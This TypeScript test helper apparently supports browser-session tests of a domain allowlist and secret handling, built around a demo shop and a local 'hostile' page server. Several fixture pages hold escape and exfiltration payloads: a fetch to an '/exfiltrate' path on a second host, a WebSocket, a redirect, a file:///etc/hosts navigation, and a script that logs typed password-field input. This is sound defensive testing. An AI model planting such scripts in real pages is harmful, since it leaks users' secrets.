import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { createSecretValue, Redactor, type SecretValue } from "@testament/config/node";
import { type RunningShop, startShop, type Variant } from "@testament/fixture-shop";
import {
  type Observation,
  type ObservedElement,
  openSession,
  type Session,
  type SessionOptions,
} from "@testament/browser";

// Shared setup for the browser tests: the demo shop on 127.0.0.1, and a small
// "hostile" page server for traffic the shop's CSP would stop before our guard.
// `localhost` is the second host: same machine, not in the allowlist.

export const ALLOWED = ["127.0.0.1"];
export const PASSWORD = "shop-demo-pass";

export async function shop(variant: Variant = "correct"): Promise<RunningShop & { port: number }> {
  const running = await startShop({ variant, port: 0 });
  return { ...running, port: Number(new URL(running.url).port) };
}

export async function seed(url: string, body: Record<string, unknown> = {}): Promise<void> {
  await fetch(`${url}/__test/reset`, { method: "POST" });
  const response = await fetch(`${url}/__test/seed`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!response.ok) throw new Error(`seed failed: ${response.status}`);
}

export function secret(
  name: string,
  value: string,
  domains: string[],
  redactor = new Redactor(),
): SecretValue {
  return createSecretValue(name, value, { domains, redactor, origin: "test" });
}

export function open(base: string, options: Partial<SessionOptions> = {}): Promise<Session> {
  return openSession({ baseUrl: base, allowedDomains: ALLOWED, ...options });
}

export function find(
  observation: Observation,
  role: string,
  name: string | RegExp,
): ObservedElement & { ref: string } {
  const match = observation.elements.find(
    (e) => e.role === role && (typeof name === "string" ? e.name === name : name.test(e.name)),
  );
  if (!match?.ref) {
    throw new Error(
      `no ${role} "${name}" with a ref in:\n${observation.elements.map((e) => `${e.role} ${e.name}`).join("\n")}`,
    );
  }
  return match as ObservedElement & { ref: string };
}

/** Logs in through the page with the secret password. */
export async function login(
  session: Session,
  password: { secret: string } | string = { secret: "SHOP_PASSWORD" },
): Promise<void> {
  await session.act({ type: "goto", url: "/login" });
  const page = await session.observe();
  await session.act({
    type: "fill",
    target: { ref: find(page, "textbox", "Email").ref },
    value: "ada@example.com",
  });
  const filled = await session.act({
    type: "fill",
    target: { ref: find(page, "textbox", "Password").ref },
    value: password,
  });
  if (filled.status !== "ok") throw new Error(`password fill: ${filled.status} ${filled.message}`);
  const done = await session.act({
    type: "click",
    target: { ref: find(page, "button", "Log in").ref },
  });
  if (!done.post.urlAfter.includes("/dashboard"))
    throw new Error(`login landed on ${done.post.urlAfter}`);
}

export interface Hostile {
  url: string;
  port: number;
  /** The same server reached through the other host name. */
  other: string;
  hits: string[];
  stop(): Promise<void>;
}

/** Pages that try to leave the allowlist in every way a browser can. */
export async function hostile(): Promise<Hostile> {
  const hits: string[] = [];
  let other = "";
  const html = (body: string) =>
    `<!doctype html><html><head><title>Hostile</title></head><body>${body}</body></html>`;
  const pages: Record<
    string,
    () => { type?: string; body: string; headers?: Record<string, string>; status?: number }
  > = {
    "/": () => ({ body: html("<h1>Hostile home</h1>") }),
    "/links": () => ({
      body: html(`<h1>Links</h1>
<a href="${other}/away">Leave</a>
<a href="${other}/popup" target="_blank">Popup</a>
<a href="/file.txt" download>Download</a>
<a href="/redirect">Redirect away</a>
<button onclick="location.href='data:text/html,<h1>data page</h1>'">Data page</button>
<button onclick="location.href='file:///etc/hosts'">File page</button>`),
    }),
    "/frame": () => ({
      body: html(`<h1>Frame</h1><iframe title="Other host" src="${other}/framed"></iframe>`),
    }),
    "/fetch": () => ({
      body: html(
        `<h1>Fetch</h1><script>fetch("${other}/exfiltrate").then(() => document.title = "sent", () => document.title = "blocked")</script>`,
      ),
    }),
    "/socket": () => ({
      body: html(`<h1>Socket</h1><script>
const ws = new WebSocket("${other.replace("http", "ws")}/ws");
ws.onopen = () => document.title = "open";
ws.onclose = () => document.title = "closed";
</script>`),
    }),
    "/worker": () => ({
      body: html(`<h1>Worker</h1><script>
if (!navigator.serviceWorker) document.title = "no service worker";
else navigator.serviceWorker.register("/sw.js").then((r) => document.title = r ? "registered" : "not registered", () => document.title = "refused");
</script>`),
    }),
    "/form": () => ({
      body: html(`<h1>Form</h1><label><input type="checkbox"> Remember me</label><p id="o"></p>
<button ondblclick="document.getElementById('o').textContent='double'">Twice</button>`),
    }),
    "/sw.js": () => ({
      type: "text/javascript",
      body: "self.addEventListener('fetch', () => {});",
    }),
    "/file.txt": () => ({
      type: "text/plain",
      body: "download me",
      headers: { "content-disposition": "attachment; filename=file.txt" },
    }),
    "/redirect": () => ({ status: 302, body: "", headers: { location: `${other}/landed` } }),
    "/console": () => ({
      body: html(`<h1>Console</h1><label>Secret field <input id="s" type="password"></label>
<script>document.getElementById("s").addEventListener("input", (e) => console.log("typed:", e.target.value));</script>`),
    }),
  };
  const server: Server = createServer((req, res) => {
    const path = new URL(req.url ?? "/", "http://x").pathname;
    hits.push(`${req.headers.host}${path}`);
    const page = pages[path];
    if (!page) {
      res.writeHead(404).end("not found");
      return;
    }
    const { type = "text/html", body, headers = {}, status = 200 } = page();
    res.writeHead(status, { "content-type": type, ...headers }).end(body);
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const { port } = server.address() as AddressInfo;
  other = `http://localhost:${port}`;
  return {
    url: `http://127.0.0.1:${port}`,
    port,
    other,
    hits,
    stop: () => new Promise((resolve) => server.close(() => resolve())),
  };
}

/** Polls until `check` is true (the page does things on its own time). */
export async function eventually(
  check: () => boolean | Promise<boolean>,
  timeoutMs = 5000,
): Promise<void> {
  const end = Date.now() + timeoutMs;
  while (Date.now() < end) {
    if (await check()) return;
    await new Promise((r) => setTimeout(r, 50));
  }
  throw new Error("condition not met in time");
}
